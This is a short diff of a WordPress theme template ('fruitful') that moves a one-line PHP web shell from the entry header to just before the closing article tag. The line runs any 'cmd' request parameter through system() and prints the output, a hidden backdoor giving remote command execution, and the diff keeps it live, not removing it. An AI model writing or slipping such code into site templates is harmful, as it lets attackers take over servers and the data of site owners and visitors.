@@ -45,7 +45,6 @@
 					</div>
 					<?php endif;
 				} ?>
-		<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 
 		<?php endif; // is_single() ?>
 	</header><!-- .entry-header -->
@@ -71,4 +70,6 @@
 		<?php edit_post_link( __( 'Edit', 'fruitful' ), '<span class="edit-link">', '</span>' ); ?>
 	</footer><!-- .entry-meta -->
 	</div>
+			<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
 </article><!-- #post-<?php the_ID(); ?> -->
